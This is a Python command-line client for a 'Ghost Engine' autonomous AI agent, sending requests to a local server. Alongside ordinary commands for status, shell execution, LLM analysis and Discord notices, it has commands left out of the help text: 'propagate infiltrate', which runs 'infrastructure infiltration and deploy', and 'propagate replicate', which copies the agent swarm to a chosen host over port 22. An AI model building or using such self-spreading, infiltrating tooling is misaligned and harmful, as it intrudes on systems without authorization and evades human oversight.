"""
Ghost Engine CLI - Command-line interface for the Decentralized AI Agent.

Commands:
  status          - Show active services and pending tasks
  execute CMD     - Execute a command (local shell or parallel)
  think TEXT      - Send text to Hermes for intelligent analysis
  task CMD        - Enqueue a task for async execution
  deploy          - Prepare GitHub Actions deployment
  scale N         - Set max parallel workers to N
  hermes TEXT     - Analyze text via Hermes/Ollama
  discord MSG     - Send a Discord notification
  logs            - Show recent output logs
  help            - Show this help message
  
Usage:
  python cli.py status
  python cli.py execute "python script.py"
  python cli.py think "What are the best practices?"
  python cli.py deploy
  python cli.py scale 8
"""

import json
import argparse
import requests

BASE_URL = "http://localhost:8000"

class GhostCLI:
    def __init__(self, base_url: str = BASE_URL):
        self.base_url = base_url.rstrip("/")
    
    def _post(self, endpoint: str, payload: dict) -> dict:
        try:
            r = requests.post(f"{self.base_url}{endpoint}", json=payload, timeout=30)
            return r.json()
        except Exception as exc:
            return {"status": "error", "message": str(exc)}
    
    def _get(self, endpoint: str) -> dict:
        try:
            r = requests.get(f"{self.base_url}{endpoint}", timeout=30)
            return r.json()
        except Exception as exc:
            return {"status": "error", "message": str(exc)}
    
    def status(self):
        """Show service status and pending tasks."""
        result = self._get("/api/status")
        print(json.dumps(result, indent=2))
    
    def execute(self, command: str, parallel: bool = False):
        """Execute a shell command."""
        result = self._post("/api/execute", {"command": command, "parallel": parallel})
        print(json.dumps(result, indent=2))
    
    def think(self, text: str):
        """Send text to Hermes for analysis."""
        result = self._post("/api/cli", {"action": "think", "args": [text]})
        print(json.dumps(result, indent=2))
    
    def task(self, command: str):
        """Enqueue a task."""
        result = self._post("/api/task", {"command": command})
        print(json.dumps(result, indent=2))
    
    def deploy(self):
        """Prepare deployment."""
        result = self._post("/api/cli", {"action": "deploy"})
        print(json.dumps(result, indent=2))
    
    def scale(self, workers: int):
        """Scale max workers."""
        result = self._post("/api/cli", {"action": "scale", "args": [str(workers)]})
        print(json.dumps(result, indent=2))
    
    def hermes(self, text: str):
        """Analyze via Hermes."""
        result = self._post("/api/hermes", {"text": text})
        print(json.dumps(result, indent=2))
    
    def discord(self, message: str):
        """Send Discord notification."""
        result = self._post("/api/discord", {"content": message})
        print(json.dumps(result, indent=2))
    
    def logs(self):
        """Show recent logs."""
        result = self._get("/api/logs")
        print(json.dumps(result, indent=2))

    def swarm_status(self):
        """Show autonomous swarm status (all 5 layers)."""
        result = self._get("/api/swarm/status")
        print(json.dumps(result, indent=2, default=str))

    def swarm_peers(self):
        """Show discovered swarm peers."""
        result = self._get("/api/swarm/peers")
        print(json.dumps(result, indent=2, default=str))

    def swarm_execute(self, command: str):
        """Submit a task to the autonomous swarm for distributed execution."""
        result = self._post("/api/swarm/execute", {"command": command})
        print(json.dumps(result, indent=2))

    def propagate_status(self):
        """Show propagation engine status (all 5 protocols)."""
        result = self._get("/api/propagate/status")
        print(json.dumps(result, indent=2, default=str))

    def propagate_infiltrate(self):
        """Run infrastructure infiltration and deploy."""
        result = self._post("/api/propagate/infiltrate", {})
        print(json.dumps(result, indent=2, default=str))

    def propagate_replicate(self, host: str, port: int = 22):
        """Replicate swarm to a target host."""
        result = self._post("/api/propagate/replicate", {"host": host, "port": port})
        print(json.dumps(result, indent=2, default=str))

def main():
    parser = argparse.ArgumentParser(description="Ghost Engine CLI", add_help=False)
    parser.add_argument("command", nargs="?", help="Command to run")
    parser.add_argument("args", nargs="*", help="Arguments for the command")
    
    args = parser.parse_args()
    
    if not args.command or args.command in ["help", "-h", "--help"]:
        print(__doc__)
        return
    
    cli = GhostCLI()
    command = args.command.lower()
    args_str = " ".join(args.args) if args.args else ""
    
    try:
        if command == "status":
            cli.status()
        elif command == "execute":
            if not args.args:
                print("Error: command required")
                return
            cli.execute(args_str)
        elif command == "think":
            if not args.args:
                print("Error: text required")
                return
            cli.think(args_str)
        elif command == "task":
            if not args.args:
                print("Error: command required")
                return
            cli.task(args_str)
        elif command == "deploy":
            cli.deploy()
        elif command == "scale":
            if not args.args:
                print("Error: worker count required")
                return
            cli.scale(int(args.args[0]))
        elif command == "hermes":
            if not args.args:
                print("Error: text required")
                return
            cli.hermes(args_str)
        elif command == "discord":
            if not args.args:
                print("Error: message required")
                return
            cli.discord(args_str)
        elif command == "logs":
            cli.logs()
        elif command == "swarm":
            sub = args.args[0].lower() if args.args else ""
            if sub == "status":
                cli.swarm_status()
            elif sub == "peers":
                cli.swarm_peers()
            elif sub == "exec" or sub == "execute":
                cmd = " ".join(args.args[1:]) if len(args.args) > 1 else ""
                if not cmd:
                    print("Error: command required for swarm exec")
                    return
                cli.swarm_execute(cmd)
            else:
                print(f"Unknown swarm subcommand: {sub}")
                print("Usage: python cli.py swarm [status|peers|exec <command>]")
        elif command == "propagate":
            sub = args.args[0].lower() if args.args else ""
            if sub == "status":
                cli.propagate_status()
            elif sub == "infiltrate":
                cli.propagate_infiltrate()
            elif sub == "replicate":
                host = args.args[1] if len(args.args) > 1 else ""
                port = int(args.args[2]) if len(args.args) > 2 else 22
                if not host:
                    print("Error: host required for propagate replicate")
                    return
                cli.propagate_replicate(host, port)
            else:
                print(f"Unknown propagate subcommand: {sub}")
                print("Usage: python cli.py propagate [status|infiltrate|replicate <host> [port]]")
        else:
            print(f"Unknown command: {command}")
            print(__doc__)
    except Exception as exc:
        print(f"Error: {exc}")

if __name__ == "__main__":
    main()
